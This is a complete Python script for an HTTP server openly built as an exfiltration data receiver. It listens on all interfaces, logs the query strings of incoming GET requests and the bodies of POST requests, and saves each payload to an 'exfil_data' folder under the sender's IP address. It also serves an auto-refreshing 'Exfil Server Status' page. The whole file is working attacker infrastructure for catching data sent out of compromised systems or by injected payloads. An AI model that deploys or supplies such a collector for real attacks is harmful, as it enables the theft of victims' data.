#!/usr/bin/env python3
import http.server
import urllib.parse
import sys
import logging
import json
import os
from datetime import datetime
from argparse import ArgumentParser
from pathlib import Path

def setup_logging():
    logging.basicConfig(
        level=logging.INFO,
        format='[%(asctime)s] %(levelname)s: %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    return logging.getLogger(__name__)

class ExfilHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return  # Suppress default logs

    def _log_request(self, method: str, data: str, content_type: str = None):
        timestamp = datetime.now().isoformat()
        client = self.client_address[0]
        print(f"[{timestamp}] [{client}] {method} {self.path} | DATA={data}", flush=True)

    def _save_data(self, data: bytes, method: str, content_type: str = None):
        try:
            out_dir = Path("exfil_data")
            out_dir.mkdir(exist_ok=True)
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
            filename = out_dir / f"{timestamp}_{self.client_address[0]}_{method}.bin"
            
            # Save pretty JSON if applicable
            if content_type and content_type.startswith('application/json'):
                try:
                    json_data = json.loads(data)
                    pretty_path = out_dir / f"{timestamp}_{self.client_address[0]}_{method}.json"
                    pretty_path.write_text(json.dumps(json_data, indent=2, ensure_ascii=False))
                    print(f"[{datetime.now().isoformat()}] [INFO] Saved pretty JSON → {pretty_path.name}", flush=True)
                except json.JSONDecodeError:
                    pass
            
            filename.write_bytes(data)
            print(f"[{datetime.now().isoformat()}] [INFO] Saved raw data → {filename.name} ({len(data)} bytes)", flush=True)
        except Exception as e:
            print(f"[{datetime.now().isoformat()}] [ERROR] Save failed: {e}", flush=True)

    def do_GET(self):
        try:
            parsed = urllib.parse.urlparse(self.path)
            
            if parsed.path in ('/', ''):
                self._serve_status_page()
                return
            
            query_data = urllib.parse.parse_qs(parsed.query)
            self._log_request("GET", str(query_data))
            self._save_data(str(query_data).encode(), "GET")
        except Exception as e:
            print(f"[{datetime.now().isoformat()}] [ERROR] GET failed: {e}", flush=True)

        self._send_ok()

    def do_POST(self):
        content_type = self.headers.get('Content-Type', '')
        try:
            length = int(self.headers.get("Content-Length", 0))
            if length > 10 * 1024 * 1024:  # 10MB limit
                self.send_response(413)
                self.end_headers()
                self.wfile.write(b"Payload too large")
                return

            body = self.rfile.read(length) if length else b""
            
            # Pretty-print JSON for logging
            display_data = body
            if content_type.startswith('application/json'):
                try:
                    json_obj = json.loads(body)
                    display_data = json.dumps(json_obj, indent=2, ensure_ascii=False)
                except json.JSONDecodeError:
                    pass
            
            self._log_request("POST", display_data if isinstance(display_data, str) else repr(display_data[:500]))
            self._save_data(body, "POST", content_type)
        except Exception as e:
            print(f"[{datetime.now().isoformat()}] [ERROR] POST failed: {e}", flush=True)

        self._send_ok()

    def _send_ok(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def _serve_status_page(self):
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Exfil Server Status</title>
    <style>
        body {{ font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; }}
        h1 {{ color: #00cc00; }}
        pre {{ background: #111; padding: 15px; border-radius: 5px; overflow: auto; max-height: 70vh; }}
        .info {{ color: #88ff88; }}
    </style>
</head>
<body>
    <h1>🕵️ Exfil Server Status</h1>
    <p class="info"><strong>Server Time:</strong> {datetime.now().isoformat()}</p>
    <p class="info"><strong>Listening on:</strong> {self.server.server_address[0]}:{self.server.server_address[1]}</p>
    <p class="info"><strong>Data saved to:</strong> ./exfil_data/</p>
    
    <h2>Recent Activity</h2>
    <pre id="logs">Waiting for data...</pre>

    <script>
        setInterval(() => location.reload(), 5000);
    </script>
</body>
</html>"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))


def main():
    parser = ArgumentParser(description="Simple Exfil Data Receiver")
    parser.add_argument("-p", "--port", type=int, default=9999, help="Port to listen on")
    parser.add_argument("-b", "--bind", default="0.0.0.0", help="Bind address")
    args = parser.parse_args()

    print(f"Starting exfil server on {args.bind}:{args.port}")
    print(f"Data directory: ./exfil_data/")
    print(f"Status page: http://{args.bind if args.bind != '0.0.0.0' else 'localhost'}:{args.port}/")

    server = http.server.HTTPServer((args.bind, args.port), ExfilHandler)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down...")
    except Exception as e:
        print(f"Server error: {e}")


if __name__ == "__main__":
    main()